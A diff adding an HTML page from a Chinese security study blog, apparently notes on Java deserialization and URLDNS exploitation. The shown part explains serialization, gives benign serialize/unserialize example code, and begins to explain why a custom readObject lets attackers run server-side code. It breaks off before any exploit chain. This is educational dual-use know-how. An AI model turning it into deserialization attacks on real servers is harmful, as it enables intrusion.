@@ -1,0 +1,882 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#7732b1">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去Drunkbaby师傅的博客中进行学习！Drunkbaby’s Blog  参考链接：Java反序列化基础篇-01-反序列化概念与利用 一、基础概念1.1 概念序列化（Serialization）是指将数据结构或对象转换为一种可以存储或传输的格式的过程。这种格式通常是字节流或字符串，以便可以通过网络传输、保存到文件中或存储在数据库中。常">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化基础概念与URLDNS利用">
+<meta property="og:url" content="http://candyb0x.github.io/2024/07/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8EURLDNS%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去Drunkbaby师傅的博客中进行学习！Drunkbaby’s Blog  参考链接：Java反序列化基础篇-01-反序列化概念与利用 一、基础概念1.1 概念序列化（Serialization）是指将数据结构或对象转换为一种可以存储或传输的格式的过程。这种格式通常是字节流或字符串，以便可以通过网络传输、保存到文件中或存储在数据库中。常">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618261.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618695.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272207377.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272232143.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272234646.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272309684.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272310836.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272311383.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272312890.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272331296.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272334790.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272354425.png">
+<meta property="article:published_time" content="2024-07-27T15:53:54.000Z">
+<meta property="article:modified_time" content="2025-08-17T10:06:29.492Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="利用链">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618261.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Java反序列化基础概念与URLDNS利用 - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化基础概念与URLDNS利用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-27 23:53" pubdate>
+          2024年7月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java反序列化基础概念与URLDNS利用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>该博客为参考学习笔记博客，仅为本人记录的笔记，所以欢迎大家去<code>Drunkbaby</code>师傅的博客中进行学习！<a target="_blank" rel="noopener" href="https://drun1baby.top/">Drunkbaby’s Blog</a></p>
+</blockquote>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/">Java反序列化基础篇-01-反序列化概念与利用</a></p>
+<h1 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p><strong>序列化（Serialization）</strong>是指将数据结构或对象转换为一种可以存储或传输的格式的过程。这种格式通常是字节流或字符串，以便可以通过网络传输、保存到文件中或存储在数据库中。常见的序列化格式包括JSON、XML、二进制格式等。</p>
+<p><strong>反序列化（Deserialization）</strong>是指将序列化的数据格式转换回原始数据结构或对象的过程。通过反序列化，可以从存储或传输的格式中重新构建出原始的数据结构或对象。</p>
+<blockquote>
+<p>简单理解：</p>
+<p>序列化：对象 -&gt; 字符串</p>
+<p>反序列化：字符串 -&gt; 对象</p>
+</blockquote>
+<h2 id="1-2-目的"><a href="#1-2-目的" class="headerlink" title="1.2 目的"></a>1.2 目的</h2><p>为了方便数据的传输！</p>
+<ol>
+<li><strong>数据持久化</strong>：将数据保存到文件、数据库等存储介质中，以便在以后重新加载和使用。</li>
+<li><strong>数据传输</strong>：在网络通信中，通过序列化将数据转换为可以传输的格式，并在接收端通过反序列化恢复为原始数据。</li>
+<li><strong>跨平台数据交换</strong>：不同系统或编程语言之间的数据交换，通过标准的序列化格式（如JSON、XML等）实现互操作性。</li>
+</ol>
+<h2 id="1-3-应用场景"><a href="#1-3-应用场景" class="headerlink" title="1.3 应用场景"></a>1.3 应用场景</h2><ol>
+<li>想把内存中的对象保存到一个文件中或者是数据库当中。</li>
+<li>用套接字在网络上传输对象。</li>
+<li>通过 RMI 传输对象的时候。</li>
+</ol>
+<h2 id="1-4-常见的序列化格式"><a href="#1-4-常见的序列化格式" class="headerlink" title="1.4 常见的序列化格式"></a>1.4 常见的序列化格式</h2><p><strong>JSON</strong>：一种轻量级的数据交换格式，易于人类阅读和编写，同时也便于机器解析和生成。</p>
+<p><strong>XML</strong>（<strong>SOAP</strong>）：一种标记语言，广泛用于文档存储和数据传输。</p>
+<p><strong>Protobuf</strong>：Google开发的高效二进制序列化格式，适用于高性能需求的应用场景。</p>
+<p><strong>YAML</strong>：一种易读的序列化格式，常用于配置文件。</p>
+<h1 id="二、java原生序列化"><a href="#二、java原生序列化" class="headerlink" title="二、java原生序列化"></a>二、java原生序列化</h1><ul>
+<li>类文件：<strong>Person.java</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>序列化文件 <strong>serializationTest.java</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.serializationTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:51</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>反序列化文件 <strong>unserializeTest.java</strong></li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.unserialize;<br><br><span class="hljs-keyword">import</span> com.mango.serialize.Person;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.unserialize.unserializeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:55</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>依次运行<strong>serializeTest.java</strong>和<strong>unserialize.java</strong>可以得到相应的结果；</p>
+<p>运行<strong>serialize.java</strong>即可得到类Person序列化后的文件<strong>ser.bin</strong>，然后运行<strong>unserialize.java</strong>将序列化的<strong>ser.bin</strong>反序列化后进行输出；</p>
+<h2 id="2-1-serialize-java文件解析"><a href="#2-1-serialize-java文件解析" class="headerlink" title="2.1 serialize.java文件解析"></a>2.1 serialize.java文件解析</h2><p>函数<strong>serialize</strong>封装了序列化功能，通过创建<code>FileOutputStream</code>输出流对象将序列化后的数据输出到文件<code>ser.bin</code>中，再通过<code>ObjectOutputStream</code>对象的<strong>writeObject</strong>方法将对象进行序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));	<span class="hljs-comment">// 对象输出流数据输出到ser.bin文件中</span><br>        oos.writeObject(obj);	<span class="hljs-comment">//obj对象序列化写入输出流</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="2-2-unserialize-java文件解析"><a href="#2-2-unserialize-java文件解析" class="headerlink" title="2.2 unserialize.java文件解析"></a>2.2 unserialize.java文件解析</h2><p>刚好与序列化相反，直接读取序列化的数据<code>ser.bin</code>中的序列化数据，在调用<strong>ObjectInputStream</strong>对象的<strong>readObject</strong>方法进行反序列化读取到类对象；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));	<span class="hljs-comment">//读取指定文件作为对象输入流数据</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();	<span class="hljs-comment">// 反序列化读取对象</span><br>    <span class="hljs-keyword">return</span> obj;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="2-3-Serializable接口说明"><a href="#2-3-Serializable接口说明" class="headerlink" title="2.3 Serializable接口说明"></a>2.3 Serializable接口说明</h2><ol>
+<li>序列化类的属性没有实现 Serializable 那么在序列化就会报错！</li>
+</ol>
+<p>只有实现 了<strong>Serializable</strong> 或者 <strong>Externalizable</strong> 接口的类的对象才能被序列化为字节序列。（不是则会抛出异常）</p>
+<p>Serializable 接口是 Java 提供的序列化接口，它是一个空接口，所以其实我们不需要实现什么。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618261.png" srcset="/img/loading.gif" lazyload alt="image-20240727161753172"></p>
+<p>Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。如果我们此处将 Serializable 接口删除掉的话，会导致如下结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407271618695.png" srcset="/img/loading.gif" lazyload alt="image-20240727161840651"></p>
+<ol start="2">
+<li>在反序列化过程中，它的父类如果没有实现序列化接口（implements Serializable），那么将需要提供无参构造函数来重新创建对象。</li>
+<li>一个实现 Serializable 接口的子类也是可以被序列化的。</li>
+<li>静态成员变量是不能被序列化</li>
+<li>transient 标识的对象成员变量不参与序列化</li>
+</ol>
+<h1 id="三、序列化安全问题"><a href="#三、序列化安全问题" class="headerlink" title="三、序列化安全问题"></a>三、序列化安全问题</h1><h2 id="3-1-安全问题产生的原因"><a href="#3-1-安全问题产生的原因" class="headerlink" title="3.1 安全问题产生的原因"></a>3.1 安全问题产生的原因</h2><ul>
+<li>序列化与反序列化当中有两个 <strong>“特别特别特别特别特别”</strong> 重要的方法 ———— <code>writeObject</code> 和 <code>readObject</code>。</li>
+</ul>
+<p>这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p>
+<blockquote>
+<p>举个例子，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是重写以下两个 private 方法：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">readObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> readObject(Object.class);<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (enableOverride) &#123;<br>            writeObjectOverride(obj);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeObject0(obj, <span class="hljs-literal">false</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>            <span class="hljs-keyword">if</span> (depth == <span class="hljs-number">0</span>) &#123;<br>                writeFatalException(ex);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> ex;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException<br></code></pre></td></tr></table></figure>
+
+<p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p>
+<blockquote>
+<p>解释一下传递类的<code>readObject</code>函数会自动执行的原因：</p>
+<p>当 <code>ObjectInputStream</code> 反序列化一个对象时，它会检查该类是否定义了一个私有的 <code>readObject</code> 方法。如果存在这样的一个方法，它就会调用这个方法来反序列化对象，而不是使用默认的反序列化机制。这允许开发者在反序列化过程中插入自定义的逻辑。</p>
